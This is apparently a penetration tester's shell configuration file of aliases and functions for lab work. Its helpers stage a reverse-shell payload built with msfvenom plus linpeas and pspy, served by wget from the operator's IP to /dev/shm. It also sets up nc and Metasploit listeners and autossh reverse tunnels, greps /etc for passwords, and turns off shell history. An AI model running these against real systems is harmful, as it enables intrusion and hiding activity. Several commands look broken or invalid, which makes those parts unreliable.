# Enhanced 'ls' for detailed and sorted directory listing
alias ll='ls -lsaht --color=auto --group-directories-first'

# For ease of use
function get_myip() {
    export myip=$(ip addr show tun0 | grep -oP 'inet \K[\d.]+')
    echo -n $myip | xclip -selection clipboard
    export myip=$myip
}
get_myip

alias serve="echo http://$myip; python -m http.server"

# Decode base64
decode64() {
    echo -n "$1" | base64 -d
}
alias de='decode64'

# Grep through my notes
function gn() { grep -ri $1 ~/repos/offsec/$2 }

# Colored and context-aware grep with PCRE support
alias grep='grep --color=auto -P'

# Quick directory navigation
alias ..='cd ..'
alias ...='cd ../..' 
alias ....='cd ../../..'

# Enhanced network enumeration and exploitation
alias listen='ip a | grep tun0; sudo rlwrap -cAz nc -lvnp'
alias scan='sudo rustscan -t 3000 --tries 2 -b 2048 -u 16384 -a'
alias nmap-scan='sudo nmap -sC -sV -oN nmap_scan.txt'
alias nikto='nikto -host'

# Advanced scanning with detailed logging
function rustscan-log() {
    if [ -z "$1" ]; then
        echo "Usage: rustscan-log <target IP>"
    else
        sudo rustscan -a $1 --ulimit 5000 -b 2048 | tee rustscan_$1.txt
    fi
}

# Repetitive gobuster script, url as argument
function dbd() { gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -k -t 15 --exclude-length 0 }

function dbf() { gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -k -t 15 --exclude-length 0 }

function dbdl() { gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt -k -t 15 --exclude-length 0 }

function dbfl() { gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-files-lowercase.txt -k -t 15 --exclude-length 0 }

# Something more reliable than gobuster
function wfd() { wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories.txt --hc 404 $@ }

function wff() { wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 $@ }

function wffl() { wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files-lowercase.txt --hc 404 $@ }

export smbAddress="\\\\\\${myip}\\share"
alias smbserver='echo -ne "\033]0;SMBserv\007"; echo "net use x: $smbAddress /user:sender password"; impacket-smbserver share . -username sender -password password -smb2support'

# Repetitive hashcat command
function hc() { hashcat $1 /usr/share/wordlists/rockyou.txt $@ -O}

# Clean Rustscan output for better readability
alias clean='sed -e '\''s/\x1b\[[0-9;]*m//g'\'''
# Example: clean initial > rustscan_cleaned.txt

# Automated extraction and cleaning of nmap results
alias nmap-summary="grep 'open\|filtered\|closed' nmap_scan.txt | awk '{print \$1,\$2}'"

function serve() {
    if [[ $# -eq 0 ]]; then
        echo "wget http://$myip:8000/pspy64 -O /dev/shm/pspy; wget http://$myip:8000/linpeas.sh -O /dev/shm/linpeas.sh; chmod +x /dev/shm/*;"
        python -m http.server;
    elif [[ $# -eq 1 ]]; then
        echo "wget http://$myip:$1/pspy64 -O /dev/shm/pspy; wget http://$myip:$1/linpeas.sh -O /dev/shm/linpeas.sh; chmod +x /dev/shm/*;"
        python -m http.server $1
    elif [[ $# -eq 2 ]]; then
        echo "wget http://$myip:$1/pspy64 -O /dev/shm/pspy; wget http://$myip:$1/linpeas.sh -O /dev/shm/linpeas.sh; wget http://$myip:$1/shell$2 -O /dev/shm/shell$2; chmod +x /dev/shm/*;"
        msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=$myip LPORT=$2 -o /dev/shm/shell$2
        python -m http.server $1
    fi
}

# Reverse shell snippets ready for deployment
alias revshells='cat /opt/tools/reverse-shells.txt | grep'

# Quick checks for open ports using netstat
alias checkports='sudo netstat -tuln'

# Quick privilege escalation enumeration with LinPEAS and WinPEAS
alias linpeas='curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
alias winpeas='curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winpeas.exe && wine winpeas.exe'

# Function to automate privilege escalation checks
function checkpe() {
    echo "[+] Checking for SUID binaries..."
    findsuid
    echo "[+] Running LinPEAS..."
    linpeas
    echo "[+] Checking for world-writable files..."
    find / -writable 2>/dev/null | tee writable_files.txt
}

# Quick SUID binary search across the system
alias findsuid='find / -perm -4000 -type f 2>/dev/null'

# Customized tmux session for pentesting
alias tmuxpen='tmux new-session -s pentest \; split-window -v \; split-window -h \; attach'
alias tmuxrestore='tmux attach-session -t pentest || tmuxpen'

# Customized tmux session for pentesting with multiple windows
alias tmuxpen='tmux new -s pentest \; split-window -h \; split-window -v \; attach'
alias tmuxrestore='tmux attach-session -t pentest || tmuxpen'

# Automated extraction based on file type
function extract() {
    if [ -f $1 ]; then
        case $1 in
            *.tar.bz2) tar xjf $1 ;;
            *.tar.gz) tar xzf $1 ;;
            *.bz2) bunzip2 $1 ;;
            *.rar) unrar x $1 ;;
            *.gz) gunzip $1 ;;
            *.tar) tar xf $1 ;;
            *.tbz2) tar xjf $1 ;;
            *.tgz) tar xzf $1 ;;
            *.zip) unzip $1 ;;
            *.Z) uncompress $1 ;;
            *.7z) 7z x $1 ;;
            *) echo "'$1' cannot be extracted via extract()" ;;
        esac
    else
        echo "'$1' is not a valid file"
    fi
}

# Networking shortcuts for quick testing
alias pingtest='ping -c 4'
alias realip='curl ifconfig.me'

# Network traffic monitoring with tcpdump
alias sniff='sudo tcpdump -i tun0 -w capture.pcap'
alias viewpcap='wireshark capture.pcap'

# Quick enumeration of running processes and logins
alias psaux='ps aux | grep'
alias findlogins='grep -r -i "password\|user" /etc/* 2>/dev/null'

# Reverse engineering with GDB and pwntools
alias gef='gdb -q -ex init gef'
alias pwn='pwn toolkit setup'

# SSH management with key management and sessions
alias sshadd='eval $(ssh-agent) && ssh-add ~/.ssh/id_rsa'

# Secure deletion of files
alias srm='shred -u -z -v'
alias sfill='sudo sfill -v -z'

# Disable command history temporarily
alias noh='export HISTFILE=/dev/null'

# Environment setup and security tool updates
alias toolsetup='cd ~/tools && sudo git pull && ./install.sh && cd -'

# Automation for auditing file permissions and security checks
function checkperms() {
    echo "[+] Checking for world-writable directories..."
    find / -type d -perm -002 2>/dev/null | tee world_writable_dirs.txt
    echo "[+] Checking for world-writable files..."
    find / -type f -perm -002 2>/dev/null | tee world_writable_files.txt
}

# Docker management for quick container operations
alias dclean='docker system prune -a'
alias drun='docker run -it --rm'
alias dlist='docker ps -a'
alias dexec='docker exec -it'

# Automation for script management and execution
alias scriptlist='ls -1 ~/scripts/'
alias scriptedit='vim ~/scripts/'

# Enable strict mode for Bash scripts for safer scripting
set -euo pipefail
IFS=$'\n\t'

# Interactive SSH session with Tmux persistence
function ssh_tmux {
    if [ -z "$1" ]; then
        echo "Usage: ssh_tmux <user@host>"
    else
        ssh -t $1 "tmux new-session -A -s remote_session"
    fi
}

# Automated setup for web exploitation environments
function webexploitenv() {
    mkdir -p ~/web_exploits/$1
    cd ~/web_exploits/$1
    tmux new-session -d -s webexploits
    tmux send-keys "burpsuite &" C-m
    tmux split-window -h
    tmux send-keys "gobuster dir -u $1 -w /usr/share/wordlists/dirb/common.txt -o gobuster_$1.txt" C-m
    tmux split-window -v
    tmux send-keys "nikto -host $1 -output nikto_$1.txt" C-m
    tmux attach-session -t webexploits
}


# Setup environment for binary exploitation
function binexp() {
    mkdir -p ~/bin_exploits/$1
    cd ~/bin_exploits/$1
    tmux new-session -d -s binexploits
    tmux send-keys "gef -q $1" C-m
    tmux split-window -h
    tmux send-keys "pwntools setup" C-m
    tmux split-window -v
    tmux send-keys "readelf -a $1 > readelf_$1.txt" C-m
    tmux attach-session -t binexploits
}

# Launch Metasploit with common modules preloaded
function msfquick() {
    msfconsole -x "use exploit/multi/handler; set payload $1; set LHOST $2; set LPORT $3; exploit"
}

# Auto-tunnel with autossh for long-term reverse shells
function autotunnel() {
    if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
        echo "Usage: autotunnel <LPORT> <RHOST> <RPORT>"
    else
        autossh -M 0 -f -N -R $1:localhost:$3 $2
    fi
}
